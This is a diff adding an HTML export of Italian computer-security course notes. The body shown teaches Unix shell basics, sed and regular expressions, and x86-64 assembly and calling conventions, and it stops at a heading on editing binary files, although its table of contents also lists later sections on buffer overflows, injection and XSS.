@@ -1,0 +1,1946 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Note complete</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__left">
+    <div class="stackedit__toc">
+      
+<ul>
+<li><a href="#unix-shell">Unix shell</a>
+<ul>
+<li><a href="#comandi-di-base">Comandi di base</a></li>
+<li><a href="#wildcards">Wildcards</a></li>
+<li><a href="#reindirizzamento">Reindirizzamento</a></li>
+<li><a href="#pipe">Pipe</a></li>
+</ul>
+</li>
+<li><a href="#stream-editor-ed-espressioni-regolari">Stream editor ed espressioni regolari</a>
+<ul>
+<li></li>
+<li><a href="#espressioni-regolari">Espressioni regolari</a></li>
+</ul>
+</li>
+<li><a href="#assembly">Assembly</a>
+<ul>
+<li><a href="#panoramica-del-linguaggio">Panoramica del linguaggio</a></li>
+<li><a href="#comandi">Comandi</a></li>
+<li><a href="#stack-e-chiamata-di-funzione">Stack e chiamata di funzione</a></li>
+<li><a href="#comparazione-assembly-e-codice-c">Comparazione assembly e codice C</a></li>
+<li><a href="#modificare-un-file-binario">Modificare un file binario</a></li>
+</ul>
+</li>
+<li><a href="#analisi-dei-programmi">Analisi dei programmi</a>
+<ul>
+<li><a href="#gdb">gdb</a></li>
+</ul>
+</li>
+<li><a href="#buffer-overflow">Buffer overflow</a>
+<ul>
+<li><a href="#rompere-l’integrità-e-crash">Rompere l’integrità e crash</a></li>
+<li><a href="#controllare-il-flusso-di-codice">Controllare il flusso di codice</a></li>
+<li><a href="#off-by-one-bug">Off-by-one bug</a></li>
+</ul>
+</li>
+<li><a href="#stack-overflow">Stack overflow</a>
+<ul>
+<li><a href="#esempio-1">Esempio</a></li>
+<li><a href="#altre-tecniche-di-attacco">Altre tecniche di attacco</a></li>
+<li><a href="#difese">Difese</a></li>
+</ul>
+</li>
+<li><a href="#format-strings">format strings</a>
+<ul>
+<li></li>
+<li><a href="#vulnerabilità">Vulnerabilità</a></li>
+<li><a href="#esercizio">Esercizio</a></li>
+<li><a href="#accesso-a-locazioni-arbitrarie">Accesso a locazioni arbitrarie</a></li>
+<li><a href="#prevenzione-agli-attacchi">Prevenzione agli attacchi</a></li>
+</ul>
+</li>
+<li><a href="#secure-coding">Secure coding</a>
+<ul>
+<li><a href="#analisi">Analisi</a></li>
+<li><a href="#taint-analysis">Taint analysis</a></li>
+<li><a href="#sanitizzazione">Sanitizzazione</a></li>
+<li><a href="#secure-coding-sei-cert">Secure Coding: SEI CERT</a></li>
+</ul>
+</li>
+<li><a href="#identificazione">Identificazione</a>
+<ul>
+<li><a href="#classi-di-schemi-di-identificazione">Classi di schemi di identificazione</a></li>
+<li><a href="#password">Password</a></li>
+<li><a href="#funzioni-hash">Funzioni hash</a></li>
+<li><a href="#attacchi-offline">Attacchi offline</a></li>
+<li><a href="#token-based-authentication">Token-based authentication</a></li>
+<li><a href="#biometric-authentication">Biometric authentication</a></li>
+</ul>
+</li>
+<li><a href="#controllo-degli-accessi">Controllo degli accessi</a>
+<ul>
+<li><a href="#politiche-di-controllo-degli-accessi">Politiche di controllo degli accessi</a></li>
+<li><a href="#oggetti-e-soggetti">Oggetti e soggetti</a></li>
+<li><a href="#diritti-di-accesso">Diritti di accesso</a></li>
+<li><a href="#unix-access-control">Unix Access Control</a></li>
+</ul>
+</li>
+<li><a href="#firewall">Firewall</a>
+<ul>
+<li><a href="#firewall-nat">Firewall NAT</a></li>
+<li><a href="#netfilter">Netfilter</a></li>
+</ul>
+</li>
+<li><a href="#attacchi-web-server-side">Attacchi web server side</a>
+<ul>
+<li><a href="#string-comparison-attacks">1 String comparison attacks</a></li>
+<li><a href="#file-inclusion-attacks">2 File inclusion attacks</a></li>
+<li><a href="#deserialization-attacks">3 Deserialization attacks</a></li>
+<li><a href="#sql-injection-attacks">4 SQL injection attacks</a></li>
+<li><a href="#tecniche-di-difesa">Tecniche di difesa</a></li>
+</ul>
+</li>
+<li><a href="#side-channels">Side channels</a>
+<ul>
+<li><a href="#side-channels-1">Side channels</a></li>
+<li><a href="#blind-sql-injection">Blind SQL injection</a></li>
+<li><a href="#totally-blind-sql-injection">Totally blind SQL injection</a></li>
+</ul>
+</li>
+<li><a href="#attacchi-web-client-side">Attacchi web client side</a>
+<ul>
+<li><a href="#token-di-sessione">Token di sessione</a></li>
+<li><a href="#sop">SOP</a></li>
+</ul>
+</li>
+<li><a href="#xss-e-csrf">XSS e CSRF</a>
+<ul>
+<li><a href="#reflected-xss">Reflected XSS</a></li>
+<li><a href="#stored-xss">Stored XSS</a></li>
+<li><a href="#dom-based-xss">DOM-based XSS</a></li>
+<li><a href="#prevenire-attacchi-xss">Prevenire attacchi XSS</a></li>
+<li><a href="#csrf">CSRF</a></li>
+<li><a href="#prevenire-attacchi-csrf">Prevenire attacchi CSRF</a></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+  </div>
+  <div class="stackedit__right">
+    <div class="stackedit__html">
+      <h1 id="unix-shell">Unix shell</h1>
+<p>La shell di Unix è il modo più semplice per interfacciarsi con il sistema operativo:</p>
+<ul>
+<li>eseguire programmi</li>
+<li>reindirizzare input e output</li>
+<li>connettere programmi</li>
+<li>lanciare script</li>
+</ul>
+<h2 id="comandi-di-base">Comandi di base</h2>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">ls</span>  <span class="token comment"># mostra il contenuto di una directory</span>
+<span class="token function">file</span> <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span> <span class="token comment"># mostra il tipo di file</span>
+<span class="token function">pwd</span> <span class="token comment"># mostra il percorso della directory corrente</span>
+<span class="token function">mkdir</span> <span class="token operator">&lt;</span>name<span class="token operator">&gt;</span> <span class="token comment"># crea una nuova directory</span>
+<span class="token function">cd</span> <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> <span class="token comment"># cambia la directory corrente</span>
+<span class="token function">cat</span> <span class="token operator">&lt;</span>file<span class="token operator">&gt;</span> <span class="token comment"># visualizza il contenuto di un file</span>
+<span class="token function">cat</span> <span class="token operator">&lt;</span>f1<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>f2<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>f3<span class="token operator">&gt;</span> <span class="token comment"># concatena e visualizza il contenuto di più file</span>
+<span class="token keyword">echo</span> <span class="token string">"string"</span> <span class="token comment"># stampa una stringa sulla console</span>
+<span class="token function">grep</span> <span class="token operator">&lt;</span>word<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>file<span class="token operator">&gt;</span> <span class="token comment"># cerca una parola in un file</span>
+<span class="token function">man</span> <span class="token operator">&lt;</span>command<span class="token operator">&gt;</span> <span class="token comment"># mostra il manuale di un comando</span>
+<span class="token function">find</span> <span class="token operator">&lt;</span>path<span class="token operator">&gt;</span> -name <span class="token string">"expression"</span> <span class="token comment"># cerca ricorsivamente file che hanno l'espressione nel nome</span>
+<span class="token function">sort</span> <span class="token operator">&lt;</span>file<span class="token operator">&gt;</span> <span class="token comment"># ordina le righe di un file</span>
+strings <span class="token operator">&lt;</span>file<span class="token operator">&gt;</span> <span class="token comment"># estrae le stringhe leggibili da un file binario</span>
+</code></pre>
+<h2 id="wildcards">Wildcards</h2>
+<p>Le wildcards sono dei caratteri speciali che vengono interpretate in modo particolare dai comandi:</p>
+<pre class=" language-bash"><code class="prism  language-bash">* <span class="token comment"># accetta ogni stringa di caratteri. Esempio:   ls *.txt</span>
+? <span class="token comment"># accetta un singolo carattere. Esempio:        ls file?.txt</span>
+<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span> <span class="token comment"># accetta un insieme di caratteri specificato. Esempio:  ls file[1-3].txt</span>
+</code></pre>
+<p>Nota che come comportamento di default il ‘.’ all’inizio del nome del file o subito dopo una slash deve essere specificato esplicitamente, le wildcard non lo considerano in automatico.</p>
+<h2 id="reindirizzamento">Reindirizzamento</h2>
+<p>Ci sono dei simboli per poter reindirizzare input e output:</p>
+<ul>
+<li><code>&gt;</code>  reindirizza l’output di un comando verso un file <strong>sovrascrivendone</strong> il contenuto già presente
+<ul>
+<li>es: <code>ls &gt; tempfile.txt</code> scrive l’output di <code>ls</code> nel file chiamato <code>tempfile.txt</code></li>
+</ul>
+</li>
+<li><code>&lt;</code> reindirizza il contenuto di un file come input al comando
+<ul>
+<li>es: <code>sort &lt; list.txt</code></li>
+</ul>
+</li>
+<li><code>&gt;&gt;</code>  reindirizza l’output di un comando verso un file <strong>aggiungendolo</strong> al contenuto già presente</li>
+</ul>
+<p>Linux ha tre stream di input/output di default:</p>
+<ul>
+<li><strong>stdin (0)</strong>: standard input</li>
+<li><strong>stdout (1)</strong>: standard output, dove viene stampato il normale output</li>
+<li><strong>stderr (2)</strong>: standard error, dove vengono stampati gli errori</li>
+</ul>
+<p>quindi si può anteporre il numero relativo allo stream per reindirizzare lo standard output oppure lo standard error:</p>
+<p><code>cat test.txt 2&gt; errors.txt</code> se “test.txt” non esiste allora l’errore lanciato dal programma andrà nel file “errors.txt”</p>
+<h2 id="pipe">Pipe</h2>
+<p>Le pipe sono la forma base per la comunicazione tra processi, possiamo pensarlo ad un meccanismo di reindirizzamento ma tra due programmi.</p>
+<p><code>command1 | command2</code></p>
+<p>l’output di “command1” diventa l’input di “command2”, l’output di “command2” verrà stampato sul terminale.</p>
+<p>Un esempio reale è il seguente:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> Documents
+</code></pre>
+<p>L’output di <code>ls</code> viene dato a <code>grep</code> il quale cercherà al suo interno occorrenze della stringa “Documents”, le righe che conterranno questa stringa verranno stampate in output.</p>
+<h1 id="stream-editor-ed-espressioni-regolari">Stream editor ed espressioni regolari</h1>
+<p>Uno <strong>stream editor</strong> è uno strumento usato per fare delle trasformazioni basilari su uno stream testuale in input. Uno strumento a linea di comando di questo tipo appartiene ai tool di base Unix e si chiama “<strong>sed</strong>”.</p>
+<p>La struttura base per invocare il programma <em>sed</em> è il seguente</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">sed</span> <span class="token operator">&lt;</span>commands<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>input_file<span class="token operator">&gt;</span>
+</code></pre>
+<p>Esempio, sostituire la stringa “Gigi” con “Franco” da un testo proveniente dal file di testo chiamato “input.txt”.</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">sed</span> <span class="token string">"s/Gigi/Franco/"</span> input.txt
+</code></pre>
+<p>Possiamo aggiungere l’opzione <code>-i</code> che serve per apportare il cambiamento all’interno del file, senza le modifiche vengono solamente stampate nello stream di output, senza che il file non venga toccato</p>
+<h3 id="comandi-sed">Comandi sed</h3>
+<p>Vediamo la sintassi dei comandi che <em>sed</em> utilizza per fare le sue trasformazioni.</p>
+<p>I comandi sed seguono la seguente struttura:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">[</span>addr<span class="token punctuation">]</span>X<span class="token punctuation">[</span>options<span class="token punctuation">]</span>
+</code></pre>
+<ul>
+<li><code>addr</code> (opzionale): espressione regolare, numero di riga o range di righe, che indica dove si vuole eseguire il comando</li>
+<li><code>X</code> (necessario): una singola lettere che indica l’azione del comando</li>
+<li><code>options</code>(opzionale): opzioni aggiuntive per particolari comandi</li>
+</ul>
+<p>Degli esempi di comandi sono:</p>
+<ul>
+<li>
+<p><strong>Delete</strong>, con lettera <code>d</code></p>
+<ul>
+<li><code>sed "1d" input.txt</code> stampa tutte le righe tranne la prima</li>
+<li><code>sed “1,3d” input.txt</code> stampa tutte le righe tranne le righe 1, 2 e 3</li>
+</ul>
+</li>
+<li>
+<p><strong>Print</strong>, con lettera <code>p</code></p>
+<ul>
+<li><code>sed "1p" input.txt</code> stampa la prima riga + stampa di default</li>
+<li><code>sed “1,3p” input.txt</code> stampa la riga 1, 2 e 3 + stampa di default</li>
+</ul>
+<p>Nota: per comportamento di default <em>sed</em> cerca sempre di stampare indipendentemente dal comando, quindi con il comando <code>p</code> stiamo facendo stampare ciò che già viene stampato di default, ottenendo così che con il comando <code>sed "1p" input.txt</code> viene stampata la prima riga 2 volte. Se si vuole forzare la stampa solo delle righe indicate nel comando va aggiunta l’opzione <code>-n</code> al programma</p>
+<ul>
+<li><code>sed -n “1,3p” input.txt</code> stampa solo la riga 1, 2 e 3</li>
+</ul>
+</li>
+<li>
+<p><strong>Substitution</strong>, con lettera <code>s</code></p>
+<ul>
+<li><code>sed “s/hello/hi” input.txt</code> sostituisce la <strong>prima occorrenza su ogni riga</strong> della stringa “hello” con la stringa “hi”. Nota che in questo caso il comando <code>s</code> usa due opzioni racchiuse tra slash (<code>/</code>)</li>
+<li><code>sed “s/hello/hi/g” input.txt</code> sostituisce <strong>ogni occorrenza</strong> della stringa “hello” con la stringa “hi”</li>
+<li><code>sed “s/HeLlO/hi/gi” input.txt</code>sostituisce <strong>ogni occorrenza</strong> della stringa “hello” con la stringa “hi” in modo case insensitive</li>
+</ul>
+<p>Nota: il carattere che divide le opzioni è arbitrario, lo slash è quello convenzionale ma si possono usare altri caratteri <em>single-byte</em> come:  <code>.</code> , <code>?</code></p>
+</li>
+<li>
+<p><strong>Mapping</strong>, con lettera <strong><code>y</code></strong></p>
+<ul>
+<li><code>sed “y/abc/ABC/” input.txt</code> fa un mapping carattere per carattere su ogni occorrenza, quindi mappa il primo carattere della prima opzione con il primo carattere della seconda opzione e così via. Si ottiene che tutte le ‘a’ diventano ‘A’, tutte le ‘b’ diventano ‘B’ ecc…</li>
+</ul>
+</li>
+</ul>
+<h2 id="espressioni-regolari">Espressioni regolari</h2>
+<p>Le espressioni regolari rappresentano dei pattern di stringhe con strutture particolari.</p>
+<p>Ci sono dei caratteri speciali che rappresentano la struttura:</p>
+<ul>
+<li><code>^</code> inizio della riga</li>
+<li><code>$</code> fine della riga</li>
+<li><code>.</code> singolo carattere</li>
+<li><code>.*</code> una sequenza di caratteri (anche una sequenza vuota, o sequenza con spazi)</li>
+<li><code>c*</code>  qualunque numero di occorrenze del carattere ‘c’, anche nessuna occorrenza.</li>
+<li><code>c\+</code> una o più occorrenze di ‘c’</li>
+<li><code>c\?</code> zero o una occorrenze di ‘c’</li>
+<li><code>[0-9]</code>  sequenza di caratteri numerici</li>
+<li><code>[^0-9]</code> sequenza che <strong>non contiene</strong> caratteri numerici</li>
+</ul>
+<p>Vediamo delle classi particolari:</p>
+
+<table>
+<thead>
+<tr>
+<th>Classe</th>
+<th>Significato</th>
+<th>Esempio</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>[[:alpha:]]</td>
+<td>Caratteri alfabetici</td>
+<td>[[:alpha:]]+: corrisponde a “abcXYZ”</td>
+</tr>
+<tr>
+<td>[[:digit:]]</td>
+<td>Cifre numeriche</td>
+<td>[[:digit:]]{3}: corrisponde a “123”</td>
+</tr>
+<tr>
+<td>[[:alnum:]]</td>
+<td>Caratteri alfanumerici</td>
+<td>[[:alnum:]]: corrisponde a “a1B2c3”</td>
+</tr>
+<tr>
+<td>[[:space:]]</td>
+<td>Spazi bianchi</td>
+<td>[[:space:]]+: corrisponde a " \t\n"</td>
+</tr>
+<tr>
+<td>[[:punct:]]</td>
+<td>Segni di punteggiatura</td>
+<td>[[:punct:]]: corrisponde a “!?.,;”</td>
+</tr>
+<tr>
+<td>[[:upper:]]</td>
+<td>Lettere maiuscole</td>
+<td>[[:upper:]]+: corrisponde a “ABC”</td>
+</tr>
+<tr>
+<td>[[:lower:]]</td>
+<td>Lettere minuscole</td>
+<td>[[:lower:]]+: corrisponde a “xyz”</td>
+</tr>
+<tr>
+<td>[[:blank:]]</td>
+<td>caratteri vuoti</td>
+<td>[[:blank:]]+: corrisponde a spazi e tab</td>
+</tr>
+<tr>
+<td>[[:print:]]</td>
+<td>Caratteri stampabili</td>
+<td>[[:print:]]+: corrisponde ai caratteri stampabili, inclusi gli spazi</td>
+</tr>
+</tbody>
+</table><p>Un esempio in un comando sed:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">sed</span> -E <span class="token string">'s/[[:digit:]]+/NUMERO/'</span> input.txt
+</code></pre>
+<p>Questo comando sostituisce qualsiasi sequenza di una o più cifre con la parola “NUMERO”. Ad esempio:</p>
+<ul>
+<li>“Ho 25 anni” diventa “Ho NUMERO anni”</li>
+</ul>
+<p>Nota: L’opzione <code>-E</code> in sed abilita l’uso di espressioni regolari estese, permettendo una sintassi più avanzata e flessibile per i pattern di ricerca e sostituzione.</p>
+<h3 id="back-reference">Back reference</h3>
+<p>Con alcuni comandi è comodo poter fare riferimento al testo <em>metchato</em>. questo si può fare con il carattere <code>&amp;</code>.</p>
+<p>es. aggiungere “world” dopo “hello”</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">sed</span> <span class="token string">"s/hello/&amp; world/g"</span> input.txt
+</code></pre>
+<p>In questo caso <code>&amp;</code> assume il valore della stringa <em>metchata</em>, cioè “hello”.</p>
+<p>È possibile anche riferirsi a dei blocchi racchiusi tra parentesi tonde:</p>
+<p>Ad esempio, per scambiare l’ordine di due parole:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token function">sed</span> <span class="token string">"s/\(hello\) \(world\)/\2 \1/"</span> input.txt
+</code></pre>
+<p>Questo comando cerca il pattern “hello world” e lo sostituisce con “world hello”. Le parentesi tonde creano due gruppi, e <code>\1</code> e <code>\2</code> si riferiscono rispettivamente al primo e al secondo gruppo.</p>
+<p>Nota che i <code>\</code> sulle parentesi tonde sono necessari per evitare di considerare le parentesi come caratteri da metchare.</p>
+<p>Ci sono delle sintassi particolari non standard, ma fornite da GNU:</p>
+<ul>
+<li><code>c\{n\}</code> ripete <code>c</code> n volte</li>
+<li><code>\L</code> converte in lowercase</li>
+<li><code>\U</code> converte in uppercase</li>
+</ul>
+<h1 id="assembly">Assembly</h1>
+<p>Fare <em>program exploitation</em> significa far fare qualcosa di non pianificato ad un programma.</p>
+<p>Per fare ciò si sfruttano i bug e la manipolazione del codice macchina di file eseguibili.</p>
+<p>Generalmente per fare <em>exploitation</em> non si dispone del codice sorgente ma solo dell’eseguibile scritto in <strong>linguaggio macchina</strong> (un insieme di byte).</p>
+<p>Il linguaggio <strong>assembly</strong> aiuta a rende il linguaggio macchina più leggibile, entrambi il linguaggio macchina e l’assembly dipendono dall’architettura del computer.</p>
+<p>Ci concentreremo sull’assembly <strong>x86-64 con sintassi Intel.</strong></p>
+<h2 id="panoramica-del-linguaggio">Panoramica del linguaggio</h2>
+<ul>
+<li>
+<p>Registri <em>general purpose</em> per salvare temporaneamente valori e indirizzi:</p>
+<p><code>rax, rbx, rcx, rdx, r8, ..., r15</code></p>
+</li>
+<li>
+<p><strong>Stack</strong>: il registro <code>rsp</code> rappresenta lo <em>stack pointer</em>, mentre <code>rbp</code> rappresenta il <em>base pointer</em>. Insieme delimitano la dimensione dello stack</p>
+</li>
+<li>
+<p><code>rip</code> è <em>l’instruction pointer</em> che punta alla <strong>prossima istruzione</strong> da eseguire</p>
+</li>
+<li>
+<p><code>rsi</code> e <code>rdi</code> sono registri usati principalmente nelle stringhe e nei parametri delle funzioni</p>
+</li>
+<li>
+<p>Abbiamo poi il <em>flag register <code>rFlag</code></em> che contiene l’informazione sul risultato di precedenti operazioni aritmetiche, logiche e di controllo</p>
+</li>
+</ul>
+<p>Il numero di registri è finito, e in base alla sintassi che utilizziamo ci possiamo riferire ad una porzione specifica di un registro, dal singolo byte fino alla versione a 64 bit, ad esempio con il registro <code>a</code>:</p>
+<p><img src="https://i.ibb.co/NtBDd05/image.png" alt="https://i.ibb.co/NtBDd05/image.png"></p>
+<h2 id="comandi">Comandi</h2>
+<p>Nella seguente tabella sono riassunti i principali comandi assembly:</p>
+
+<table>
+<thead>
+<tr>
+<th><strong>Sintassi del comando</strong></th>
+<th><strong>Spiegazione</strong></th>
+<th><strong>Esempio</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>mov dest, src</code></td>
+<td>Copia il valore di <code>src</code> in <code>dest</code>. Usato anche per copiare il valore presente all’indirizzo <code>[src]</code> in <code>dest</code>. Oppure salva il valore di <code>src</code> all’indirizzo contenuto in <code>[dest]</code></td>
+<td><code>mov rax, rbx</code> (copia il contenuto di <code>rbx</code> in <code>rax</code>). <code>mov rax, [rbx]</code> (carica il valore all’indirizzo contenuto in <code>rbx</code> in <code>rax</code>). <code>mov [rbx], rax</code> (memorizza il valore di <code>rax</code> all’indirizzo contenuto in <code>rbx</code>)</td>
+</tr>
+<tr>
+<td><code>add dest, src</code></td>
+<td>Somma il valore di <code>src</code> a <code>dest</code> e memorizza il risultato in <code>dest</code>.</td>
+<td><code>add rax, 10</code> (somma 10 a <code>rax</code>)</td>
+</tr>
+<tr>
+<td><code>sub dest, src</code></td>
+<td>Sottrae il valore di <code>src</code> da <code>dest</code> e memorizza il risultato in <code>dest</code>.</td>
+<td><code>sub rbx, 5</code> (sottrae 5 da <code>rbx</code>)</td>
+</tr>
+<tr>
+<td><code>and dest, src</code></td>
+<td>Esegue l’operazione logica AND tra <code>src</code> e <code>dest</code>, salvando il risultato in <code>dest</code>.</td>
+<td><code>and rax, rbx</code> (AND bit a bit tra <code>rax</code> e <code>rbx</code>)</td>
+</tr>
+<tr>
+<td><code>push src</code></td>
+<td>Salva il valore di <code>src</code> sullo stack.</td>
+<td><code>push rax</code> (salva il contenuto di <code>rax</code> sullo stack)</td>
+</tr>
+<tr>
+<td><code>pop dest</code></td>
+<td>Estrae il valore dallo stack e lo salva in <code>dest</code>.</td>
+<td><code>pop rbx</code> (estrae il valore dallo stack e lo mette in <code>rbx</code>)</td>
+</tr>
+<tr>
+<td><code>cmp dest, src</code></td>
+<td>Confronta <code>dest</code> con <code>src</code> sottraendoli (non salva il risultato, ma aggiorna i flag).</td>
+<td><code>cmp rax, 10</code> (confronta <code>rax</code> con 10)</td>
+</tr>
+<tr>
+<td><code>call label</code></td>
+<td>Salta all’indirizzo indicato da <code>label</code>, salvando l’indirizzo di ritorno sullo stack.</td>
+<td><code>call my_function</code> (chiama la funzione <code>my_function</code>)</td>
+</tr>
+<tr>
+<td><code>ret</code></td>
+<td>Ritorna all’indirizzo salvato sullo stack (usato con <code>call</code>).</td>
+<td><code>ret</code> (ritorna alla chiamata precedente)</td>
+</tr>
+<tr>
+<td><code>leave</code></td>
+<td>Ripristina il valore di <code>rsp</code> da <code>rbp</code>, quindi esegue <code>pop rbp</code> (chiude lo stack frame corrente).</td>
+<td><code>leave</code> (ripristina lo stack frame)</td>
+</tr>
+<tr>
+<td><code>jle label</code></td>
+<td>Salta a <code>label</code> se l’ultimo confronto (<code>cmp</code>) ha impostato i flag di minore o uguale (se il risultato è ≤ 0).</td>
+<td><code>jle done</code> (salta a <code>done</code> se minore o uguale)</td>
+</tr>
+<tr>
+<td><code>jge label</code></td>
+<td>Salta a <code>label</code> se l’ultimo confronto (<code>cmp</code>) ha impostato i flag di maggiore o uguale (se il risultato è ≥ 0).</td>
+<td><code>jge loop</code> (salta a <code>loop</code> se maggiore o uguale)</td>
+</tr>
+<tr>
+<td><code>lea dest, [src]</code></td>
+<td>Carica l’indirizzo di <code>src</code> in <code>dest</code> (Load Effective Address).</td>
+<td><code>lea rax, [rbx+4]</code> (carica l’indirizzo <code>rbx + 4</code> in <code>rax</code>)</td>
+</tr>
+<tr>
+<td><code>int imm</code></td>
+<td>Genera un interrupt software, solitamente usato per chiamare funzioni di sistema.</td>
+<td><code>int 0x80</code> (interrompe per una chiamata di sistema su Linux)</td>
+</tr>
+<tr>
+<td><code>nop</code></td>
+<td>Non fa nulla, occupa solo un ciclo.</td>
+<td><code>nop</code> (istruzione vuota)</td>
+</tr>
+</tbody>
+</table><p>Nota l’importante differenza:</p>
+<pre class=" language-nasm"><code class="prism  language-nasm">mov <span class="token register variable">rax</span>, <span class="token operator">[</span><span class="token register variable">rbx</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token operator">]</span>   <span class="token comment">; Carica il valore contenuto all'indirizzo rbx + 4</span>
+lea <span class="token register variable">rax</span>, <span class="token operator">[</span><span class="token register variable">rbx</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token operator">]</span>   <span class="token comment">; Carica l'indirizzo rbx + 4 in rax</span>
+</code></pre>
+<h2 id="stack-e-chiamata-di-funzione">Stack e chiamata di funzione</h2>
+<p>È utile vedere come è organizzata la memoria di un programma:</p>
+<p><img src="https://i.ibb.co/Bt7wJ9F/image.png" alt="https://i.ibb.co/Bt7wJ9F/image.png"></p>
+<p>Vediamo in particolare come lo stack parte da indirizzi alti e man mano che si riempie crescendo verso indirizzi più bassi.</p>
+<p>Lo stack è quella zona di memoria dove vengono salvate le variabili locali.</p>
+<p>supporta le operazioni di <code>push</code> (aggiunta di valori nello stack) e <code>pop</code> (rimozione di valori dallo stack)</p>
+<p>Quando viene chiamata una funzione viene impostato uno <code>stack frame</code>, cioè una zona dello stack (sempre delimitata da <code>rbp</code> e <code>rsp</code>) utilizzata durante l’esecuzione di una funzione, i valori al suo interno sono in particolare:</p>
+<ul>
+<li>eventuali parametri della funzione che non sono stati passati nei registri</li>
+<li>l’indirizzo del vecchio <code>rbp</code></li>
+<li>le variabili locali alla funzione</li>
+<li>l’indirizzo di ritorno, cioè dove dovrà andare <em>l’instruction pointer</em> per continuare l’esecuzione una volta terminata la funzione</li>
+</ul>
+<p>Il <strong>passaggio dei parametri</strong> ad una funzione segue una convenzione chiamata <strong>System V AMD64 ABI</strong> la quale stabilisce:</p>
+<ul>
+<li>i primi 6 argomenti passati alla funzione verranno salvati in ordine in: <code>rdi, rsi, rdx, rcx, r8, r9</code></li>
+<li>se ci sono altri argomenti, vengono salvati nello stack</li>
+<li>il valore di ritorno arriva fino a 128bit e verrà salvato automaticamente nei registri <code>rax</code> e, solo se necessario (se maggiore di 64bit), <code>rdx</code></li>
+</ul>
+<h3 id="chiamata-della-funzione">Chiamata della funzione</h3>
+<p>La chiamata di funzione si divide in quattro fasi</p>
+<ol>
+<li>
+<p>salvataggio dei parametri e chiamata alla funzione</p>
+<pre class=" language-nasm"><code class="prism  language-nasm">mov <span class="token register variable">rdi</span>, <span class="token operator">&lt;</span>a<span class="token operator">&gt;</span>    <span class="token comment">; primo parametro in RDI</span>
+mov <span class="token register variable">rsi</span>, <span class="token operator">&lt;</span>b<span class="token operator">&gt;</span>    <span class="token comment">; secondo parametro in RSI</span>
+call <span class="token operator">&lt;</span>foo<span class="token operator">&gt;</span>      <span class="token comment">; chiamata della funzione, salva l'indirizzo di ritorno sullo stack</span>
+</code></pre>
+</li>
+<li>
+<p>creazione dello stack frame (all’interno del corpo della funzione)</p>
+<pre class=" language-nasm"><code class="prism  language-nasm">push <span class="token register variable">rbp</span>          <span class="token comment">; Salva il vecchio base pointer nello stack</span>
+mov <span class="token register variable">rbp</span>, <span class="token register variable">rsp</span>      <span class="token comment">; Imposta il nuovo base pointer</span>
+sub <span class="token register variable">rsp</span>, <span class="token operator">&lt;</span>size<span class="token operator">&gt;</span>   <span class="token comment">; Riserva spazio per le variabili locali nello stack (se necessario)</span>
+</code></pre>
+</li>
+<li>
+<p>esecuzione del resto del corpo della funzione</p>
+</li>
+<li>
+<p>ritorno</p>
+<pre class=" language-nasm"><code class="prism  language-nasm">mov <span class="token register variable">rax</span>, return_value    <span class="token comment">; Carica il valore di ritorno in RAX</span>
+leave                    <span class="token comment">; Ripristina base pointer e stack pointer (come fare 'mov rsp, rbp' e poi 'pop rbp')</span>
+ret                      <span class="token comment">; Ritorna alla funzione chiamante</span>
+</code></pre>
+</li>
+</ol>
+<h2 id="comparazione-assembly-e-codice-c">Comparazione assembly e codice C</h2>
+<p>Vediamo la traduzione assembly del seguente codice C</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token keyword">int</span> i<span class="token punctuation">;</span>
+		<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>compilando il codice con <code>gcc count.c -o count</code> possiamo poi produrre il codice assembly con il seguente comando: <code>objdump -M intel -ds count &gt; count.s</code></p>
+<ul>
+<li><code>-M</code> permette di specificare la sintassi, nel nostro caso usiamo la sintassi Intel</li>
+<li><code>-d</code> produce il codice assembly</li>
+<li><code>-s</code> mostra le sezioni del programma</li>
+</ul>
+<p>Andando all’indirizzo della funzione main, possiamo distinguere tre colonne:</p>
+<ul>
+<li>la prima contiene gli indirizzi di memoria.</li>
+<li>la seconda contiene il linguaggio macchina, cioè i byte di cui è composto il programma</li>
+<li>e nell’ultima il codice assembly</li>
+</ul>
+<p><img src="https://i.ibb.co/g4mGTrX/assembly.png" alt="https://i.ibb.co/g4mGTrX/assembly.png"></p>
+<h2 id="modificare-un-file-binario">Modificare un file binario</h2>
+<p>File eseguibili possono essere modificati con particolari editor.</p>
